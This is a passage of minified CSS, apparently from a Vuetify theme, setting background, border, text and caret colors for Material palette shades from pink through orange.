.pink.lighten-4{background-color:#f8bbd0!important;border-color:#f8bbd0!important}.v-application .pink--text.text--lighten-4{color:#f8bbd0!important;caret-color:#f8bbd0!important}.v-application .pink.lighten-3{background-color:#f48fb1!important;border-color:#f48fb1!important}.v-application .pink--text.text--lighten-3{color:#f48fb1!important;caret-color:#f48fb1!important}.v-application .pink.lighten-2{background-color:#f06292!important;border-color:#f06292!important}.v-application .pink--text.text--lighten-2{color:#f06292!important;caret-color:#f06292!important}.v-application .pink.lighten-1{background-color:#ec407a!important;border-color:#ec407a!important}.v-application .pink--text.text--lighten-1{color:#ec407a!important;caret-color:#ec407a!important}.v-application .pink.darken-1{background-color:#d81b60!important;border-color:#d81b60!important}.v-application .pink--text.text--darken-1{color:#d81b60!important;caret-color:#d81b60!important}.v-application .pink.darken-2{background-color:#c2185b!important;border-color:#c2185b!important}.v-application .pink--text.text--darken-2{color:#c2185b!important;caret-color:#c2185b!important}.v-application .pink.darken-3{background-color:#ad1457!important;border-color:#ad1457!important}.v-application .pink--text.text--darken-3{color:#ad1457!important;caret-color:#ad1457!important}.v-application .pink.darken-4{background-color:#880e4f!important;border-color:#880e4f!important}.v-application .pink--text.text--darken-4{color:#880e4f!important;caret-color:#880e4f!important}.v-application .pink.accent-1{background-color:#ff80ab!important;border-color:#ff80ab!important}.v-application .pink--text.text--accent-1{color:#ff80ab!important;caret-color:#ff80ab!important}.v-application .pink.accent-2{background-color:#ff4081!important;border-color:#ff4081!important}.v-application .pink--text.text--accent-2{color:#ff4081!important;caret-color:#ff4081!important}.v-application .pink.accent-3{background-color:#f50057!important;border-color:#f50057!important}.v-application .pink--text.text--accent-3{color:#f50057!important;caret-color:#f50057!important}.v-application .pink.accent-4{background-color:#c51162!important;border-color:#c51162!important}.v-application .pink--text.text--accent-4{color:#c51162!important;caret-color:#c51162!important}.v-application .purple{background-color:#9c27b0!important;border-color:#9c27b0!important}.v-application .purple--text{color:#9c27b0!important;caret-color:#9c27b0!important}.v-application .purple.lighten-5{background-color:#f3e5f5!important;border-color:#f3e5f5!important}.v-application .purple--text.text--lighten-5{color:#f3e5f5!important;caret-color:#f3e5f5!important}.v-application .purple.lighten-4{background-color:#e1bee7!important;border-color:#e1bee7!important}.v-application .purple--text.text--lighten-4{color:#e1bee7!important;caret-color:#e1bee7!important}.v-application .purple.lighten-3{background-color:#ce93d8!important;border-color:#ce93d8!important}.v-application .purple--text.text--lighten-3{color:#ce93d8!important;caret-color:#ce93d8!important}.v-application .purple.lighten-2{background-color:#ba68c8!important;border-color:#ba68c8!important}.v-application .purple--text.text--lighten-2{color:#ba68c8!important;caret-color:#ba68c8!important}.v-application .purple.lighten-1{background-color:#ab47bc!important;border-color:#ab47bc!important}.v-application .purple--text.text--lighten-1{color:#ab47bc!important;caret-color:#ab47bc!important}.v-application .purple.darken-1{background-color:#8e24aa!important;border-color:#8e24aa!important}.v-application .purple--text.text--darken-1{color:#8e24aa!important;caret-color:#8e24aa!important}.v-application .purple.darken-2{background-color:#7b1fa2!important;border-color:#7b1fa2!important}.v-application .purple--text.text--darken-2{color:#7b1fa2!important;caret-color:#7b1fa2!important}.v-application .purple.darken-3{background-color:#6a1b9a!important;border-color:#6a1b9a!important}.v-application .purple--text.text--darken-3{color:#6a1b9a!important;caret-color:#6a1b9a!important}.v-application .purple.darken-4{background-color:#4a148c!important;border-color:#4a148c!important}.v-application .purple--text.text--darken-4{color:#4a148c!important;caret-color:#4a148c!important}.v-application .purple.accent-1{background-color:#ea80fc!important;border-color:#ea80fc!important}.v-application .purple--text.text--accent-1{color:#ea80fc!important;caret-color:#ea80fc!important}.v-application .purple.accent-2{background-color:#e040fb!important;border-color:#e040fb!important}.v-application .purple--text.text--accent-2{color:#e040fb!important;caret-color:#e040fb!important}.v-application .purple.accent-3{background-color:#d500f9!important;border-color:#d500f9!important}.v-application .purple--text.text--accent-3{color:#d500f9!important;caret-color:#d500f9!important}.v-application .purple.accent-4{background-color:#a0f!important;border-color:#a0f!important}.v-application .purple--text.text--accent-4{color:#a0f!important;caret-color:#a0f!important}.v-application .deep-purple{background-color:#673ab7!important;border-color:#673ab7!important}.v-application .deep-purple--text{color:#673ab7!important;caret-color:#673ab7!important}.v-application .deep-purple.lighten-5{background-color:#ede7f6!important;border-color:#ede7f6!important}.v-application .deep-purple--text.text--lighten-5{color:#ede7f6!important;caret-color:#ede7f6!important}.v-application .deep-purple.lighten-4{background-color:#d1c4e9!important;border-color:#d1c4e9!important}.v-application .deep-purple--text.text--lighten-4{color:#d1c4e9!important;caret-color:#d1c4e9!important}.v-application .deep-purple.lighten-3{background-color:#b39ddb!important;border-color:#b39ddb!important}.v-application .deep-purple--text.text--lighten-3{color:#b39ddb!important;caret-color:#b39ddb!important}.v-application .deep-purple.lighten-2{background-color:#9575cd!important;border-color:#9575cd!important}.v-application .deep-purple--text.text--lighten-2{color:#9575cd!important;caret-color:#9575cd!important}.v-application .deep-purple.lighten-1{background-color:#7e57c2!important;border-color:#7e57c2!important}.v-application .deep-purple--text.text--lighten-1{color:#7e57c2!important;caret-color:#7e57c2!important}.v-application .deep-purple.darken-1{background-color:#5e35b1!important;border-color:#5e35b1!important}.v-application .deep-purple--text.text--darken-1{color:#5e35b1!important;caret-color:#5e35b1!important}.v-application .deep-purple.darken-2{background-color:#512da8!important;border-color:#512da8!important}.v-application .deep-purple--text.text--darken-2{color:#512da8!important;caret-color:#512da8!important}.v-application .deep-purple.darken-3{background-color:#4527a0!important;border-color:#4527a0!important}.v-application .deep-purple--text.text--darken-3{color:#4527a0!important;caret-color:#4527a0!important}.v-application .deep-purple.darken-4{background-color:#311b92!important;border-color:#311b92!important}.v-application .deep-purple--text.text--darken-4{color:#311b92!important;caret-color:#311b92!important}.v-application .deep-purple.accent-1{background-color:#b388ff!important;border-color:#b388ff!important}.v-application .deep-purple--text.text--accent-1{color:#b388ff!important;caret-color:#b388ff!important}.v-application .deep-purple.accent-2{background-color:#7c4dff!important;border-color:#7c4dff!important}.v-application .deep-purple--text.text--accent-2{color:#7c4dff!important;caret-color:#7c4dff!important}.v-application .deep-purple.accent-3{background-color:#651fff!important;border-color:#651fff!important}.v-application .deep-purple--text.text--accent-3{color:#651fff!important;caret-color:#651fff!important}.v-application .deep-purple.accent-4{background-color:#6200ea!important;border-color:#6200ea!important}.v-application .deep-purple--text.text--accent-4{color:#6200ea!important;caret-color:#6200ea!important}.v-application .indigo{background-color:#3f51b5!important;border-color:#3f51b5!important}.v-application .indigo--text{color:#3f51b5!important;caret-color:#3f51b5!important}.v-application .indigo.lighten-5{background-color:#e8eaf6!important;border-color:#e8eaf6!important}.v-application .indigo--text.text--lighten-5{color:#e8eaf6!important;caret-color:#e8eaf6!important}.v-application .indigo.lighten-4{background-color:#c5cae9!important;border-color:#c5cae9!important}.v-application .indigo--text.text--lighten-4{color:#c5cae9!important;caret-color:#c5cae9!important}.v-application .indigo.lighten-3{background-color:#9fa8da!important;border-color:#9fa8da!important}.v-application .indigo--text.text--lighten-3{color:#9fa8da!important;caret-color:#9fa8da!important}.v-application .indigo.lighten-2{background-color:#7986cb!important;border-color:#7986cb!important}.v-application .indigo--text.text--lighten-2{color:#7986cb!important;caret-color:#7986cb!important}.v-application .indigo.lighten-1{background-color:#5c6bc0!important;border-color:#5c6bc0!important}.v-application .indigo--text.text--lighten-1{color:#5c6bc0!important;caret-color:#5c6bc0!important}.v-application .indigo.darken-1{background-color:#3949ab!important;border-color:#3949ab!important}.v-application .indigo--text.text--darken-1{color:#3949ab!important;caret-color:#3949ab!important}.v-application .indigo.darken-2{background-color:#303f9f!important;border-color:#303f9f!important}.v-application .indigo--text.text--darken-2{color:#303f9f!important;caret-color:#303f9f!important}.v-application .indigo.darken-3{background-color:#283593!important;border-color:#283593!important}.v-application .indigo--text.text--darken-3{color:#283593!important;caret-color:#283593!important}.v-application .indigo.darken-4{background-color:#1a237e!important;border-color:#1a237e!important}.v-application .indigo--text.text--darken-4{color:#1a237e!important;caret-color:#1a237e!important}.v-application .indigo.accent-1{background-color:#8c9eff!important;border-color:#8c9eff!important}.v-application .indigo--text.text--accent-1{color:#8c9eff!important;caret-color:#8c9eff!important}.v-application .indigo.accent-2{background-color:#536dfe!important;border-color:#536dfe!important}.v-application .indigo--text.text--accent-2{color:#536dfe!important;caret-color:#536dfe!important}.v-application .indigo.accent-3{background-color:#3d5afe!important;border-color:#3d5afe!important}.v-application .indigo--text.text--accent-3{color:#3d5afe!important;caret-color:#3d5afe!important}.v-application .indigo.accent-4{background-color:#304ffe!important;border-color:#304ffe!important}.v-application .indigo--text.text--accent-4{color:#304ffe!important;caret-color:#304ffe!important}.v-application .blue{background-color:#2196f3!important;border-color:#2196f3!important}.v-application .blue--text{color:#2196f3!important;caret-color:#2196f3!important}.v-application .blue.lighten-5{background-color:#e3f2fd!important;border-color:#e3f2fd!important}.v-application .blue--text.text--lighten-5{color:#e3f2fd!important;caret-color:#e3f2fd!important}.v-application .blue.lighten-4{background-color:#bbdefb!important;border-color:#bbdefb!important}.v-application .blue--text.text--lighten-4{color:#bbdefb!important;caret-color:#bbdefb!important}.v-application .blue.lighten-3{background-color:#90caf9!important;border-color:#90caf9!important}.v-application .blue--text.text--lighten-3{color:#90caf9!important;caret-color:#90caf9!important}.v-application .blue.lighten-2{background-color:#64b5f6!important;border-color:#64b5f6!important}.v-application .blue--text.text--lighten-2{color:#64b5f6!important;caret-color:#64b5f6!important}.v-application .blue.lighten-1{background-color:#42a5f5!important;border-color:#42a5f5!important}.v-application .blue--text.text--lighten-1{color:#42a5f5!important;caret-color:#42a5f5!important}.v-application .blue.darken-1{background-color:#1e88e5!important;border-color:#1e88e5!important}.v-application .blue--text.text--darken-1{color:#1e88e5!important;caret-color:#1e88e5!important}.v-application .blue.darken-2{background-color:#1976d2!important;border-color:#1976d2!important}.v-application .blue--text.text--darken-2{color:#1976d2!important;caret-color:#1976d2!important}.v-application .blue.darken-3{background-color:#1565c0!important;border-color:#1565c0!important}.v-application .blue--text.text--darken-3{color:#1565c0!important;caret-color:#1565c0!important}.v-application .blue.darken-4{background-color:#0d47a1!important;border-color:#0d47a1!important}.v-application .blue--text.text--darken-4{color:#0d47a1!important;caret-color:#0d47a1!important}.v-application .blue.accent-1{background-color:#82b1ff!important;border-color:#82b1ff!important}.v-application .blue--text.text--accent-1{color:#82b1ff!important;caret-color:#82b1ff!important}.v-application .blue.accent-2{background-color:#448aff!important;border-color:#448aff!important}.v-application .blue--text.text--accent-2{color:#448aff!important;caret-color:#448aff!important}.v-application .blue.accent-3{background-color:#2979ff!important;border-color:#2979ff!important}.v-application .blue--text.text--accent-3{color:#2979ff!important;caret-color:#2979ff!important}.v-application .blue.accent-4{background-color:#2962ff!important;border-color:#2962ff!important}.v-application .blue--text.text--accent-4{color:#2962ff!important;caret-color:#2962ff!important}.v-application .light-blue{background-color:#03a9f4!important;border-color:#03a9f4!important}.v-application .light-blue--text{color:#03a9f4!important;caret-color:#03a9f4!important}.v-application .light-blue.lighten-5{background-color:#e1f5fe!important;border-color:#e1f5fe!important}.v-application .light-blue--text.text--lighten-5{color:#e1f5fe!important;caret-color:#e1f5fe!important}.v-application .light-blue.lighten-4{background-color:#b3e5fc!important;border-color:#b3e5fc!important}.v-application .light-blue--text.text--lighten-4{color:#b3e5fc!important;caret-color:#b3e5fc!important}.v-application .light-blue.lighten-3{background-color:#81d4fa!important;border-color:#81d4fa!important}.v-application .light-blue--text.text--lighten-3{color:#81d4fa!important;caret-color:#81d4fa!important}.v-application .light-blue.lighten-2{background-color:#4fc3f7!important;border-color:#4fc3f7!important}.v-application .light-blue--text.text--lighten-2{color:#4fc3f7!important;caret-color:#4fc3f7!important}.v-application .light-blue.lighten-1{background-color:#29b6f6!important;border-color:#29b6f6!important}.v-application .light-blue--text.text--lighten-1{color:#29b6f6!important;caret-color:#29b6f6!important}.v-application .light-blue.darken-1{background-color:#039be5!important;border-color:#039be5!important}.v-application .light-blue--text.text--darken-1{color:#039be5!important;caret-color:#039be5!important}.v-application .light-blue.darken-2{background-color:#0288d1!important;border-color:#0288d1!important}.v-application .light-blue--text.text--darken-2{color:#0288d1!important;caret-color:#0288d1!important}.v-application .light-blue.darken-3{background-color:#0277bd!important;border-color:#0277bd!important}.v-application .light-blue--text.text--darken-3{color:#0277bd!important;caret-color:#0277bd!important}.v-application .light-blue.darken-4{background-color:#01579b!important;border-color:#01579b!important}.v-application .light-blue--text.text--darken-4{color:#01579b!important;caret-color:#01579b!important}.v-application .light-blue.accent-1{background-color:#80d8ff!important;border-color:#80d8ff!important}.v-application .light-blue--text.text--accent-1{color:#80d8ff!important;caret-color:#80d8ff!important}.v-application .light-blue.accent-2{background-color:#40c4ff!important;border-color:#40c4ff!important}.v-application .light-blue--text.text--accent-2{color:#40c4ff!important;caret-color:#40c4ff!important}.v-application .light-blue.accent-3{background-color:#00b0ff!important;border-color:#00b0ff!important}.v-application .light-blue--text.text--accent-3{color:#00b0ff!important;caret-color:#00b0ff!important}.v-application .light-blue.accent-4{background-color:#0091ea!important;border-color:#0091ea!important}.v-application .light-blue--text.text--accent-4{color:#0091ea!important;caret-color:#0091ea!important}.v-application .cyan{background-color:#00bcd4!important;border-color:#00bcd4!important}.v-application .cyan--text{color:#00bcd4!important;caret-color:#00bcd4!important}.v-application .cyan.lighten-5{background-color:#e0f7fa!important;border-color:#e0f7fa!important}.v-application .cyan--text.text--lighten-5{color:#e0f7fa!important;caret-color:#e0f7fa!important}.v-application .cyan.lighten-4{background-color:#b2ebf2!important;border-color:#b2ebf2!important}.v-application .cyan--text.text--lighten-4{color:#b2ebf2!important;caret-color:#b2ebf2!important}.v-application .cyan.lighten-3{background-color:#80deea!important;border-color:#80deea!important}.v-application .cyan--text.text--lighten-3{color:#80deea!important;caret-color:#80deea!important}.v-application .cyan.lighten-2{background-color:#4dd0e1!important;border-color:#4dd0e1!important}.v-application .cyan--text.text--lighten-2{color:#4dd0e1!important;caret-color:#4dd0e1!important}.v-application .cyan.lighten-1{background-color:#26c6da!important;border-color:#26c6da!important}.v-application .cyan--text.text--lighten-1{color:#26c6da!important;caret-color:#26c6da!important}.v-application .cyan.darken-1{background-color:#00acc1!important;border-color:#00acc1!important}.v-application .cyan--text.text--darken-1{color:#00acc1!important;caret-color:#00acc1!important}.v-application .cyan.darken-2{background-color:#0097a7!important;border-color:#0097a7!important}.v-application .cyan--text.text--darken-2{color:#0097a7!important;caret-color:#0097a7!important}.v-application .cyan.darken-3{background-color:#00838f!important;border-color:#00838f!important}.v-application .cyan--text.text--darken-3{color:#00838f!important;caret-color:#00838f!important}.v-application .cyan.darken-4{background-color:#006064!important;border-color:#006064!important}.v-application .cyan--text.text--darken-4{color:#006064!important;caret-color:#006064!important}.v-application .cyan.accent-1{background-color:#84ffff!important;border-color:#84ffff!important}.v-application .cyan--text.text--accent-1{color:#84ffff!important;caret-color:#84ffff!important}.v-application .cyan.accent-2{background-color:#18ffff!important;border-color:#18ffff!important}.v-application .cyan--text.text--accent-2{color:#18ffff!important;caret-color:#18ffff!important}.v-application .cyan.accent-3{background-color:#00e5ff!important;border-color:#00e5ff!important}.v-application .cyan--text.text--accent-3{color:#00e5ff!important;caret-color:#00e5ff!important}.v-application .cyan.accent-4{background-color:#00b8d4!important;border-color:#00b8d4!important}.v-application .cyan--text.text--accent-4{color:#00b8d4!important;caret-color:#00b8d4!important}.v-application .teal{background-color:#009688!important;border-color:#009688!important}.v-application .teal--text{color:#009688!important;caret-color:#009688!important}.v-application .teal.lighten-5{background-color:#e0f2f1!important;border-color:#e0f2f1!important}.v-application .teal--text.text--lighten-5{color:#e0f2f1!important;caret-color:#e0f2f1!important}.v-application .teal.lighten-4{background-color:#b2dfdb!important;border-color:#b2dfdb!important}.v-application .teal--text.text--lighten-4{color:#b2dfdb!important;caret-color:#b2dfdb!important}.v-application .teal.lighten-3{background-color:#80cbc4!important;border-color:#80cbc4!important}.v-application .teal--text.text--lighten-3{color:#80cbc4!important;caret-color:#80cbc4!important}.v-application .teal.lighten-2{background-color:#4db6ac!important;border-color:#4db6ac!important}.v-application .teal--text.text--lighten-2{color:#4db6ac!important;caret-color:#4db6ac!important}.v-application .teal.lighten-1{background-color:#26a69a!important;border-color:#26a69a!important}.v-application .teal--text.text--lighten-1{color:#26a69a!important;caret-color:#26a69a!important}.v-application .teal.darken-1{background-color:#00897b!important;border-color:#00897b!important}.v-application .teal--text.text--darken-1{color:#00897b!important;caret-color:#00897b!important}.v-application .teal.darken-2{background-color:#00796b!important;border-color:#00796b!important}.v-application .teal--text.text--darken-2{color:#00796b!important;caret-color:#00796b!important}.v-application .teal.darken-3{background-color:#00695c!important;border-color:#00695c!important}.v-application .teal--text.text--darken-3{color:#00695c!important;caret-color:#00695c!important}.v-application .teal.darken-4{background-color:#004d40!important;border-color:#004d40!important}.v-application .teal--text.text--darken-4{color:#004d40!important;caret-color:#004d40!important}.v-application .teal.accent-1{background-color:#a7ffeb!important;border-color:#a7ffeb!important}.v-application .teal--text.text--accent-1{color:#a7ffeb!important;caret-color:#a7ffeb!important}.v-application .teal.accent-2{background-color:#64ffda!important;border-color:#64ffda!important}.v-application .teal--text.text--accent-2{color:#64ffda!important;caret-color:#64ffda!important}.v-application .teal.accent-3{background-color:#1de9b6!important;border-color:#1de9b6!important}.v-application .teal--text.text--accent-3{color:#1de9b6!important;caret-color:#1de9b6!important}.v-application .teal.accent-4{background-color:#00bfa5!important;border-color:#00bfa5!important}.v-application .teal--text.text--accent-4{color:#00bfa5!important;caret-color:#00bfa5!important}.v-application .green{background-color:#4caf50!important;border-color:#4caf50!important}.v-application .green--text{color:#4caf50!important;caret-color:#4caf50!important}.v-application .green.lighten-5{background-color:#e8f5e9!important;border-color:#e8f5e9!important}.v-application .green--text.text--lighten-5{color:#e8f5e9!important;caret-color:#e8f5e9!important}.v-application .green.lighten-4{background-color:#c8e6c9!important;border-color:#c8e6c9!important}.v-application .green--text.text--lighten-4{color:#c8e6c9!important;caret-color:#c8e6c9!important}.v-application .green.lighten-3{background-color:#a5d6a7!important;border-color:#a5d6a7!important}.v-application .green--text.text--lighten-3{color:#a5d6a7!important;caret-color:#a5d6a7!important}.v-application .green.lighten-2{background-color:#81c784!important;border-color:#81c784!important}.v-application .green--text.text--lighten-2{color:#81c784!important;caret-color:#81c784!important}.v-application .green.lighten-1{background-color:#66bb6a!important;border-color:#66bb6a!important}.v-application .green--text.text--lighten-1{color:#66bb6a!important;caret-color:#66bb6a!important}.v-application .green.darken-1{background-color:#43a047!important;border-color:#43a047!important}.v-application .green--text.text--darken-1{color:#43a047!important;caret-color:#43a047!important}.v-application .green.darken-2{background-color:#388e3c!important;border-color:#388e3c!important}.v-application .green--text.text--darken-2{color:#388e3c!important;caret-color:#388e3c!important}.v-application .green.darken-3{background-color:#2e7d32!important;border-color:#2e7d32!important}.v-application .green--text.text--darken-3{color:#2e7d32!important;caret-color:#2e7d32!important}.v-application .green.darken-4{background-color:#1b5e20!important;border-color:#1b5e20!important}.v-application .green--text.text--darken-4{color:#1b5e20!important;caret-color:#1b5e20!important}.v-application .green.accent-1{background-color:#b9f6ca!important;border-color:#b9f6ca!important}.v-application .green--text.text--accent-1{color:#b9f6ca!important;caret-color:#b9f6ca!important}.v-application .green.accent-2{background-color:#69f0ae!important;border-color:#69f0ae!important}.v-application .green--text.text--accent-2{color:#69f0ae!important;caret-color:#69f0ae!important}.v-application .green.accent-3{background-color:#00e676!important;border-color:#00e676!important}.v-application .green--text.text--accent-3{color:#00e676!important;caret-color:#00e676!important}.v-application .green.accent-4{background-color:#00c853!important;border-color:#00c853!important}.v-application .green--text.text--accent-4{color:#00c853!important;caret-color:#00c853!important}.v-application .light-green{background-color:#8bc34a!important;border-color:#8bc34a!important}.v-application .light-green--text{color:#8bc34a!important;caret-color:#8bc34a!important}.v-application .light-green.lighten-5{background-color:#f1f8e9!important;border-color:#f1f8e9!important}.v-application .light-green--text.text--lighten-5{color:#f1f8e9!important;caret-color:#f1f8e9!important}.v-application .light-green.lighten-4{background-color:#dcedc8!important;border-color:#dcedc8!important}.v-application .light-green--text.text--lighten-4{color:#dcedc8!important;caret-color:#dcedc8!important}.v-application .light-green.lighten-3{background-color:#c5e1a5!important;border-color:#c5e1a5!important}.v-application .light-green--text.text--lighten-3{color:#c5e1a5!important;caret-color:#c5e1a5!important}.v-application .light-green.lighten-2{background-color:#aed581!important;border-color:#aed581!important}.v-application .light-green--text.text--lighten-2{color:#aed581!important;caret-color:#aed581!important}.v-application .light-green.lighten-1{background-color:#9ccc65!important;border-color:#9ccc65!important}.v-application .light-green--text.text--lighten-1{color:#9ccc65!important;caret-color:#9ccc65!important}.v-application .light-green.darken-1{background-color:#7cb342!important;border-color:#7cb342!important}.v-application .light-green--text.text--darken-1{color:#7cb342!important;caret-color:#7cb342!important}.v-application .light-green.darken-2{background-color:#689f38!important;border-color:#689f38!important}.v-application .light-green--text.text--darken-2{color:#689f38!important;caret-color:#689f38!important}.v-application .light-green.darken-3{background-color:#558b2f!important;border-color:#558b2f!important}.v-application .light-green--text.text--darken-3{color:#558b2f!important;caret-color:#558b2f!important}.v-application .light-green.darken-4{background-color:#33691e!important;border-color:#33691e!important}.v-application .light-green--text.text--darken-4{color:#33691e!important;caret-color:#33691e!important}.v-application .light-green.accent-1{background-color:#ccff90!important;border-color:#ccff90!important}.v-application .light-green--text.text--accent-1{color:#ccff90!important;caret-color:#ccff90!important}.v-application .light-green.accent-2{background-color:#b2ff59!important;border-color:#b2ff59!important}.v-application .light-green--text.text--accent-2{color:#b2ff59!important;caret-color:#b2ff59!important}.v-application .light-green.accent-3{background-color:#76ff03!important;border-color:#76ff03!important}.v-application .light-green--text.text--accent-3{color:#76ff03!important;caret-color:#76ff03!important}.v-application .light-green.accent-4{background-color:#64dd17!important;border-color:#64dd17!important}.v-application .light-green--text.text--accent-4{color:#64dd17!important;caret-color:#64dd17!important}.v-application .lime{background-color:#cddc39!important;border-color:#cddc39!important}.v-application .lime--text{color:#cddc39!important;caret-color:#cddc39!important}.v-application .lime.lighten-5{background-color:#f9fbe7!important;border-color:#f9fbe7!important}.v-application .lime--text.text--lighten-5{color:#f9fbe7!important;caret-color:#f9fbe7!important}.v-application .lime.lighten-4{background-color:#f0f4c3!important;border-color:#f0f4c3!important}.v-application .lime--text.text--lighten-4{color:#f0f4c3!important;caret-color:#f0f4c3!important}.v-application .lime.lighten-3{background-color:#e6ee9c!important;border-color:#e6ee9c!important}.v-application .lime--text.text--lighten-3{color:#e6ee9c!important;caret-color:#e6ee9c!important}.v-application .lime.lighten-2{background-color:#dce775!important;border-color:#dce775!important}.v-application .lime--text.text--lighten-2{color:#dce775!important;caret-color:#dce775!important}.v-application .lime.lighten-1{background-color:#d4e157!important;border-color:#d4e157!important}.v-application .lime--text.text--lighten-1{color:#d4e157!important;caret-color:#d4e157!important}.v-application .lime.darken-1{background-color:#c0ca33!important;border-color:#c0ca33!important}.v-application .lime--text.text--darken-1{color:#c0ca33!important;caret-color:#c0ca33!important}.v-application .lime.darken-2{background-color:#afb42b!important;border-color:#afb42b!important}.v-application .lime--text.text--darken-2{color:#afb42b!important;caret-color:#afb42b!important}.v-application .lime.darken-3{background-color:#9e9d24!important;border-color:#9e9d24!important}.v-application .lime--text.text--darken-3{color:#9e9d24!important;caret-color:#9e9d24!important}.v-application .lime.darken-4{background-color:#827717!important;border-color:#827717!important}.v-application .lime--text.text--darken-4{color:#827717!important;caret-color:#827717!important}.v-application .lime.accent-1{background-color:#f4ff81!important;border-color:#f4ff81!important}.v-application .lime--text.text--accent-1{color:#f4ff81!important;caret-color:#f4ff81!important}.v-application .lime.accent-2{background-color:#eeff41!important;border-color:#eeff41!important}.v-application .lime--text.text--accent-2{color:#eeff41!important;caret-color:#eeff41!important}.v-application .lime.accent-3{background-color:#c6ff00!important;border-color:#c6ff00!important}.v-application .lime--text.text--accent-3{color:#c6ff00!important;caret-color:#c6ff00!important}.v-application .lime.accent-4{background-color:#aeea00!important;border-color:#aeea00!important}.v-application .lime--text.text--accent-4{color:#aeea00!important;caret-color:#aeea00!important}.v-application .yellow{background-color:#ffeb3b!important;border-color:#ffeb3b!important}.v-application .yellow--text{color:#ffeb3b!important;caret-color:#ffeb3b!important}.v-application .yellow.lighten-5{background-color:#fffde7!important;border-color:#fffde7!important}.v-application .yellow--text.text--lighten-5{color:#fffde7!important;caret-color:#fffde7!important}.v-application .yellow.lighten-4{background-color:#fff9c4!important;border-color:#fff9c4!important}.v-application .yellow--text.text--lighten-4{color:#fff9c4!important;caret-color:#fff9c4!important}.v-application .yellow.lighten-3{background-color:#fff59d!important;border-color:#fff59d!important}.v-application .yellow--text.text--lighten-3{color:#fff59d!important;caret-color:#fff59d!important}.v-application .yellow.lighten-2{background-color:#fff176!important;border-color:#fff176!important}.v-application .yellow--text.text--lighten-2{color:#fff176!important;caret-color:#fff176!important}.v-application .yellow.lighten-1{background-color:#ffee58!important;border-color:#ffee58!important}.v-application .yellow--text.text--lighten-1{color:#ffee58!important;caret-color:#ffee58!important}.v-application .yellow.darken-1{background-color:#fdd835!important;border-color:#fdd835!important}.v-application .yellow--text.text--darken-1{color:#fdd835!important;caret-color:#fdd835!important}.v-application .yellow.darken-2{background-color:#fbc02d!important;border-color:#fbc02d!important}.v-application .yellow--text.text--darken-2{color:#fbc02d!important;caret-color:#fbc02d!important}.v-application .yellow.darken-3{background-color:#f9a825!important;border-color:#f9a825!important}.v-application .yellow--text.text--darken-3{color:#f9a825!important;caret-color:#f9a825!important}.v-application .yellow.darken-4{background-color:#f57f17!important;border-color:#f57f17!important}.v-application .yellow--text.text--darken-4{color:#f57f17!important;caret-color:#f57f17!important}.v-application .yellow.accent-1{background-color:#ffff8d!important;border-color:#ffff8d!important}.v-application .yellow--text.text--accent-1{color:#ffff8d!important;caret-color:#ffff8d!important}.v-application .yellow.accent-2{background-color:#ff0!important;border-color:#ff0!important}.v-application .yellow--text.text--accent-2{color:#ff0!important;caret-color:#ff0!important}.v-application .yellow.accent-3{background-color:#ffea00!important;border-color:#ffea00!important}.v-application .yellow--text.text--accent-3{color:#ffea00!important;caret-color:#ffea00!important}.v-application .yellow.accent-4{background-color:#ffd600!important;border-color:#ffd600!important}.v-application .yellow--text.text--accent-4{color:#ffd600!important;caret-color:#ffd600!important}.v-application .amber{background-color:#ffc107!important;border-color:#ffc107!important}.v-application .amber--text{color:#ffc107!important;caret-color:#ffc107!important}.v-application .amber.lighten-5{background-color:#fff8e1!important;border-color:#fff8e1!important}.v-application .amber--text.text--lighten-5{color:#fff8e1!important;caret-color:#fff8e1!important}.v-application .amber.lighten-4{background-color:#ffecb3!important;border-color:#ffecb3!important}.v-application .amber--text.text--lighten-4{color:#ffecb3!important;caret-color:#ffecb3!important}.v-application .amber.lighten-3{background-color:#ffe082!important;border-color:#ffe082!important}.v-application .amber--text.text--lighten-3{color:#ffe082!important;caret-color:#ffe082!important}.v-application .amber.lighten-2{background-color:#ffd54f!important;border-color:#ffd54f!important}.v-application .amber--text.text--lighten-2{color:#ffd54f!important;caret-color:#ffd54f!important}.v-application .amber.lighten-1{background-color:#ffca28!important;border-color:#ffca28!important}.v-application .amber--text.text--lighten-1{color:#ffca28!important;caret-color:#ffca28!important}.v-application .amber.darken-1{background-color:#ffb300!important;border-color:#ffb300!important}.v-application .amber--text.text--darken-1{color:#ffb300!important;caret-color:#ffb300!important}.v-application .amber.darken-2{background-color:#ffa000!important;border-color:#ffa000!important}.v-application .amber--text.text--darken-2{color:#ffa000!important;caret-color:#ffa000!important}.v-application .amber.darken-3{background-color:#ff8f00!important;border-color:#ff8f00!important}.v-application .amber--text.text--darken-3{color:#ff8f00!important;caret-color:#ff8f00!important}.v-application .amber.darken-4{background-color:#ff6f00!important;border-color:#ff6f00!important}.v-application .amber--text.text--darken-4{color:#ff6f00!important;caret-color:#ff6f00!important}.v-application .amber.accent-1{background-color:#ffe57f!important;border-color:#ffe57f!important}.v-application .amber--text.text--accent-1{color:#ffe57f!important;caret-color:#ffe57f!important}.v-application .amber.accent-2{background-color:#ffd740!important;border-color:#ffd740!important}.v-application .amber--text.text--accent-2{color:#ffd740!important;caret-color:#ffd740!important}.v-application .amber.accent-3{background-color:#ffc400!important;border-color:#ffc400!important}.v-application .amber--text.text--accent-3{color:#ffc400!important;caret-color:#ffc400!important}.v-application .amber.accent-4{background-color:#ffab00!important;border-color:#ffab00!important}.v-application .amber--text.text--accent-4{color:#ffab00!important;caret-color:#ffab00!important}.v-application .orange{background-color:#ff9800!important;border-color:#ff9800!important}.v-application .orange--text{color:#ff9800!important;caret-color:#ff9800!important}.v-application .orange.lighten-5{background-color:#fff3e0!important;border-color:#fff3e0!important}.v-application .orange--text.text--lighten-5{color:#fff3e0!important;caret-color:#fff3e0!important}.v-application .orange.lighten-4{background-color:#ffe0b2!important;border-color:#ffe0b2!important}.v-application .orange--text.text--lighten-4{color:#ffe0b2!important;caret-color:#ffe0b2!important}.v-application .orange.lighten-3{background-color:#ffcc80!important;border-color:#ffcc80!important}.v-application .orange--text.text--lighten-3{color:#ffcc80!important;caret-color:#ffcc80!important}.v-application .orange.lighten-2{background-color:#ffb74d!important;border-color:#ffb74d!important}.v-application .orange--text.text--lighten-2{color:#ffb74d!important;caret-color:#ffb74d!important}.v-application .orange.lighten-1{background-color:#ffa726!important;border-color:#ffa726!important}.v-application .orange--text.text--lighten-1{color:#ffa726!important;caret-color:#ffa726!important}.v-application .orange.darken-1{background-color:#fb8c00!important;border-color:#fb8c00!important}.v-application .orange--text.text--darken-1{color:#fb8c00!important;caret-color:#fb8c00!important}.v-application .orange.darken-2{background-color:#f57c00!important;border-color:#f57c00!important}.v-application 